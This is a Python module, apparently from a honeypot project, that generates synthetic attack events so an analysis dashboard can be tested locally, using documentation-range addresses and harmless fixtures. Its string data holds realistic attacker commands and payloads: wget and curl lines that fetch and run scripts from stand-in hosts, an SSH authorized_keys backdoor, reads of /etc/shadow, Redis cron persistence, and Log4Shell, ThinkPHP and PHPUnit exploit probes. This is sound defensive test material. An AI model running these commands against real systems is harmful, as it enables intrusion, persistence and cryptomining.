"""Synthetic attack traffic for local testing: fills the event pipeline without exposing anything.

Writes the *same* JSONL events the real honeypots write, using documentation-range source
addresses (RFC 5737, never routable) and the harmless fixture files.  Together with the live
loopback driver (``live.py``) this lets the whole dashboard be explored on a laptop.
"""

from __future__ import annotations

import ipaddress
import math
import random
import time
from typing import Any

from ..analysis.fixtures import C2_IP, DROP_IP, all_fixtures
from ..common.config import Settings
from ..common.events import EventWriter, new_session_id
from ..common.netutil import TEST_NETS
from ..common.quarantine import Quarantine

USERS = ["root", "admin", "ubuntu", "user", "test", "pi", "oracle", "postgres", "ubnt", "support", "guest", "git", "ftpuser", "debian", "deploy"]
PASSWORDS = ["123456", "password", "admin", "root", "12345678", "qwerty", "1234", "toor", "raspberry", "ubnt", "changeme", "admin123",
             "P@ssw0rd", "letmein", "welcome", "111111", "test", "default", "xc3511", "vizxv", "888888", "juantech", "dreambox", "klv123"]
SSH_CLIENTS = ["SSH-2.0-libssh2_1.9.0", "SSH-2.0-Go", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-OpenSSH_8.9p1", "SSH-2.0-PUTTY", "SSH-2.0-AsyncSSH_2.14"]
USER_AGENTS = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36", "curl/7.81.0", "python-requests/2.31.0",
               "Go-http-client/1.1", "Mozilla/5.0 zgrab/0.x", "masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "Nmap Scripting Engine",
               "libredtail-http", "Hello, World", "l9explore/1.2.2"]
HTTP_PROBES = [
    ("GET", "/", "", None), ("GET", "/wp-login.php", "", None), ("GET", "/.env", "", ("env-file-probe", "", "recon", 2)),
    ("GET", "/phpmyadmin/index.php", "", None), ("GET", "/admin/config.php", "", None), ("GET", "/robots.txt", "", None),
    ("GET", "/../../../../etc/passwd", "", ("path-traversal-etc-passwd", "", "traversal", 3)),
    ("GET", "/index.php?id=1' OR '1'='1", "", ("sqli-boolean-tautology", "", "sqli", 3)),
    ("GET", "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id", "",
     ("thinkphp-5-rce", "CVE-2018-20062", "rce", 5)),
    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "<?php echo md5('x');", ("phpunit-eval-stdin", "CVE-2017-9841", "rce", 5)),
    ("GET", "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)", "", ("openwrt-luci-cmdi", "", "cmdi", 4)),
    ("GET", "/?x=${jndi:ldap://203.0.113.45:1389/a}", "", ("log4shell-jndi", "CVE-2021-44228", "rce", 5)),
    ("POST", "/xmlrpc.php", "<methodCall><methodName>wp.getUsersBlogs</methodName></methodCall>", ("wordpress-xmlrpc-multicall", "", "auth", 2)),
    ("GET", "/boaform/admin/formLogin?username=admin&psw=admin", "", ("boa-formlogin-probe", "", "recon", 2)),
    ("GET", "/GponForm/diag_Form?images/", "", ("gpon-cve-2018-10561", "CVE-2018-10561", "rce", 5)),
    ("GET", "/actuator/env", "", ("spring-actuator-probe", "", "recon", 2)),
]
INTRUDER_SCRIPTS: list[list[tuple[str, str]]] = [
    [("uname -a", "Linux srv01 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 x86_64 GNU/Linux"), ("cat /proc/cpuinfo | grep name | wc -l", "2"),
     ("free -m", "              total        used        free\nMem:           1987         412        1210"), ("whoami", "root"),
     (f"cd /tmp; wget http://{DROP_IP}/x.sh -O .x; chmod +x .x; ./.x", ""), ("crontab -l", "no crontab for root"), ("history -c", "")],
    [('cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfixturefixturefixturefixture mdrfckr">>.ssh/authorized_keys '
      '&& chmod -R go= ~/.ssh', ""), ("uname -s -v -n -r -m", "Linux srv01 5.10.0-23-amd64 #1 SMP Debian x86_64"), ("lscpu | grep Model", "Model name: Intel Xeon"),
     ("cat /etc/passwd | head -3", "root:x:0:0:root:/root:/bin/bash"), ("ps aux | grep -i xmrig", ""), ("sudo -l", "sudo: a password is required")],
    [("enable", ""), ("system", ""), ("shell", ""), ("sh", ""), ("/bin/busybox ECCHI", "ECCHI: applet not found"),
     (f"cd /tmp || cd /var/run; busybox wget http://{C2_IP}/bins/bot.x86 -O dvrHelper; chmod 777 dvrHelper; ./dvrHelper telnet.x86", ""),
     ("rm -rf /tmp/*", ""), ("cat /proc/net/tcp | head", "  sl  local_address rem_address   st")],
    [("id", "uid=0(root) gid=0(root) groups=0(root)"), ("cat /etc/shadow", "root:*:19000:0:99999:7:::"), ("netstat -antp", "Active Internet connections"),
     ("find / -name '*.pem' 2>/dev/null", ""), ("curl -s http://203.0.113.9/miner.sh | bash", ""), ("pkill -9 xmrig; killall kdevtmpfsi", "")],
]
SERVICE_PORTS = {"ssh": 22, "telnet": 23, "http": 80, "mysql": 3306, "redis": 6379}


def _hosts() -> list[str]:
    out = []
    for n in TEST_NETS:
        out += [str(h) for h in list(n.hosts())[:253]]
    return out


class SyntheticTraffic:
    def __init__(self, settings: Settings, seed: int = 1337) -> None:
        self.s = settings
        self.rng = random.Random(seed)
        red = settings.redactor()
        self.w = {name: EventWriter(name, settings.events_dir, redactor=red, max_per_ip_minute=10**9)
                  for name in ("ssh", "telnet", "http", "mysql", "redis")}
        self.quarantine = Quarantine(settings.quarantine_dir, settings.max_file_bytes, settings.max_quarantine_bytes)
        self.fixtures = all_fixtures()
        hosts = _hosts()
        self.rng.shuffle(hosts)
        self.attackers = hosts[:170]
        self.weights = [1.0 / (i + 1) ** 0.8 for i in range(len(self.attackers))]       # a few heavy hitters
        self.captured = 0

    # ---- helpers -----------------------------------------------------------------
    def ip(self) -> str:
        return self.rng.choices(self.attackers, self.weights)[0]

    def _port(self) -> int:
        return self.rng.randint(32768, 61000)

    def _emit(self, svc: str, ts: float, ev: str, ip: str, sess: str | None, sport: int, **data: Any) -> float:
        self.w[svc].emit_at(ts, ev, ip, src_port=sport, dst_port=SERVICE_PORTS[svc], session=sess, **data)
        return ts

    def _store(self, name: str, ip: str, sess: str | None, ts: float, url: str, origin: str) -> str:
        res = self.quarantine.store(self.fixtures[name], {"origin": origin, "src_ip": ip, "url": url})
        self.captured += 1
        return res.sha256

    # ---- scenarios -----------------------------------------------------------------
    def scanner(self, ts: float, ip: str) -> None:
        svc = self.rng.choice(["ssh", "telnet", "http", "mysql", "redis"])
        sp, sess = self._port(), new_session_id()
        self._emit(svc, ts, "conn.open", ip, sess, sp)
        self._emit(svc, ts + 0.02, "probe", ip, sess, sp, proto_guess=self.rng.choice(["tls-clienthello", "rdp", "smb", "unknown", "http", "sip"]),
                   first_bytes_hex="16030100", length=self.rng.randint(8, 300))
        self._emit(svc, ts + 0.3, "conn.close", ip, sess, sp, duration=0.3, bytes_in=40, bytes_out=0, reason="closed")

    def ssh_bruteforce(self, ts: float, ip: str, intruder: bool = False) -> float:
        svc = "telnet" if (intruder and self.rng.random() < 0.35) else "ssh"
        sp, sess = self._port(), new_session_id()
        self._emit(svc, ts, "conn.open", ip, sess, sp)
        client = self.rng.choice(SSH_CLIENTS)
        if svc == "ssh":
            self._emit(svc, ts + 0.1, "client.fingerprint", ip, sess, sp, client_version=client, hassh="%032x" % self.rng.getrandbits(128))
        t = ts + 0.5
        tries = self.rng.randint(1, 6) if not intruder else self.rng.randint(1, 3)
        ok_user = ok_pw = None
        for i in range(tries):
            u, p = self.rng.choice(USERS), self.rng.choice(PASSWORDS)
            last = intruder and i == tries - 1
            if last:
                u, p = ("root", "xc3511") if svc == "telnet" else (self.rng.choice(["root", "admin", "ubuntu"]), self.rng.choice(["123456", "password", "admin"]))
                ok_user, ok_pw = u, p
            t += self.rng.uniform(0.4, 2.5)
            self._emit(svc, t, "auth.attempt", ip, sess, sp, username=u, password=p, method="password", success=last, attempt=i + 1)
        if not intruder:
            self._emit(svc, t + 0.5, "conn.close", ip, sess, sp, duration=round(t + 0.5 - ts, 2), bytes_in=900, bytes_out=1200, reason="closed")
            return t
        self._emit(svc, t + 0.2, "session.open", ip, sess, sp, username=ok_user, password=ok_pw, method="password", client_version=client)
        script = self.rng.choice(INTRUDER_SCRIPTS if svc == "ssh" else [INTRUDER_SCRIPTS[2], INTRUDER_SCRIPTS[0]])
        t += 1.0
        cmds = 0
        downloads = 0
        for cmd, out in script:
            t += self.rng.uniform(0.8, 6.0)
            cmds += 1
            self._emit(svc, t, "cmd.input", ip, sess, sp, input=cmd, status=0, output=out, cwd="/root", user=ok_user)
            if "wget" in cmd or "curl" in cmd:
                m = f"http://{C2_IP}/bins/bot.x86" if C2_IP in cmd else f"http://{DROP_IP}/{'x.sh' if 'x.sh' in cmd else 'miner.sh'}"
                downloads += 1
                self._emit(svc, t + 0.1, "download.attempt", ip, sess, sp, url=m, via="wget" if "wget" in cmd else "curl", host=m.split("/")[2],
                           scheme="http", fetched=False, error="", sha256="", dest="/tmp/.x")
                name = "mirai_like_x86_64.elf" if C2_IP in cmd else self.rng.choice(["dropper.sh", "miner_setup.sh"])
                sha = self._store(name, ip, sess, t, m, "download")
                self._emit(svc, t + 0.4, "file.captured", ip, sess, sp, sha256=sha, md5="0" * 32, size=len(self.fixtures[name]), path="/tmp/.x",
                           origin="download", new=True, truncated=False, via="exec", url=m)
            if "authorized_keys" in cmd:
                sha = self._store("ssh_implant.sh", ip, sess, t, "", "echo")
                self._emit(svc, t + 0.2, "file.captured", ip, sess, sp, sha256=sha, md5="0" * 32, size=len(self.fixtures["ssh_implant.sh"]),
                           path="/root/.ssh/authorized_keys", origin="echo", new=True, truncated=False, via="session end", url="")
        self._emit(svc, t + 1.5, "session.close", ip, sess, sp, duration=round(t + 1.5 - ts, 2), commands=cmds, username=ok_user,
                   downloads=downloads, reason="closed")
        self._emit(svc, t + 1.6, "conn.close", ip, sess, sp, duration=round(t + 1.6 - ts, 2), reason="closed")
        return t

    def http_scan(self, ts: float, ip: str) -> float:
        sp, sess = self._port(), new_session_id()
        self._emit("http", ts, "conn.open", ip, sess, sp)
        ua = self.rng.choice(USER_AGENTS)
        t = ts
        for method, path, body, rule in self.rng.sample(HTTP_PROBES, self.rng.randint(1, 5)):
            t += self.rng.uniform(0.05, 1.2)
            self._emit("http", t, "http.request", ip, sess, sp, method=method, path=path, host="srv01", user_agent=ua, status=200 if path == "/" else 404,
                       body_len=len(body), body=body, content_type="application/x-www-form-urlencoded" if body else "")
            if rule:
                self._emit("http", t + 0.01, "exploit.attempt", ip, sess, sp, rule=rule[0], cve=rule[1], category=rule[2], severity=rule[3],
                           snippet=path[:80], path=path, method=method)
        if self.rng.random() < 0.25:
            t += 0.5
            u, p = self.rng.choice(USERS), self.rng.choice(PASSWORDS)
            self._emit("http", t, "auth.attempt", ip, sess, sp, username=u, password=p, method="form", success=False, path="/wp-login.php")
        if self.rng.random() < 0.05:
            t += 1.0
            sha = self._store("webshell.php", ip, sess, t, "", "http-upload")
            self._emit("http", t, "file.captured", ip, sess, sp, sha256=sha, md5="0" * 32, size=len(self.fixtures["webshell.php"]),
                       path="/wp-content/uploads/x.php", origin="http-upload", filename="x.php", new=True, truncated=False, via="http-post", url="")
        self._emit("http", t + 0.5, "conn.close", ip, sess, sp, duration=round(t + 0.5 - ts, 2), reason="closed")
        return t

    def database(self, ts: float, ip: str) -> float:
        svc = self.rng.choice(["mysql", "redis"])
        sp, sess = self._port(), new_session_id()
        self._emit(svc, ts, "conn.open", ip, sess, sp)
        t = ts + 0.2
        if svc == "mysql":
            for _ in range(self.rng.randint(1, 4)):
                t += 0.6
                self._emit(svc, t, "auth.attempt", ip, sess, sp, username=self.rng.choice(["root", "admin", "mysql"]), password="",
                           method="mysql_native_password", success=False, password_recovered=False, hash="$mysqlna$" + "ab" * 10 + "*" + "cd" * 20)
        else:
            self._emit(svc, t, "session.open", ip, sess, sp, username="", password="", method="redis-open", client_version="")
            for cmd, rule in (("INFO", None), ("CONFIG SET dir /var/spool/cron/", ("redis-config-dir-cron", "", "cron", 5)),
                              ("CONFIG SET dbfilename root", None), ("SET x \"\\n*/1 * * * * curl http://203.0.113.9/r.sh|sh\\n\"", None), ("SAVE", None)):
                if self.rng.random() < 0.5 and rule is None and cmd != "INFO":
                    continue
                t += 0.4
                self._emit(svc, t, "db.query", ip, sess, sp, engine="redis", command=cmd.split()[0].lower(), query=cmd, nargs=len(cmd.split()) - 1)
                if rule:
                    self._emit(svc, t + 0.01, "exploit.attempt", ip, sess, sp, rule=rule[0], cve=rule[1], category=rule[2], severity=rule[3],
                               snippet=cmd, method="redis")
            self._emit(svc, t + 0.3, "session.close", ip, sess, sp, duration=round(t + 0.3 - ts, 2), commands=3, username="", downloads=0, reason="closed")
        self._emit(svc, t + 0.5, "conn.close", ip, sess, sp, duration=round(t + 0.5 - ts, 2), reason="closed")
        return t

    # ---- driver --------------------------------------------------------------------
    def one(self, ts: float) -> None:
        r = self.rng.random()
        ip = self.ip()
        if r < 0.36:
            self.scanner(ts, ip)
        elif r < 0.62:
            self.ssh_bruteforce(ts, ip)
        elif r < 0.68:
            self.ssh_bruteforce(ts, ip, intruder=True)
        elif r < 0.92:
            self.http_scan(ts, ip)
        else:
            self.database(ts, ip)

    def backfill(self, hours: float = 48, per_hour: int = 90, now: float | None = None) -> int:
        """Events spread over the last ``hours`` with a day/night rhythm and one spike."""
        now = now or time.time()
        n = 0
        start = now - hours * 3600
        spike_at = start + hours * 3600 * 0.7
        t = start
        while t < now - 5:
            hour_of_day = time.gmtime(t).tm_hour
            rate = per_hour * (0.6 + 0.5 * math.sin((hour_of_day - 6) / 24 * 2 * math.pi) + 0.5)
            if abs(t - spike_at) < 900:
                rate *= 8
            gap = 3600.0 / max(rate, 1)
            t += self.rng.expovariate(1.0 / gap)
            if t < now - 5:
                self.one(t)
                n += 1
        return n

    def live(self, seconds: float, rate_per_min: float = 20) -> int:
        end = time.time() + seconds
        n = 0
        while time.time() < end:
            self.one(time.time())
            n += 1
            time.sleep(self.rng.expovariate(rate_per_min / 60.0))
        return n
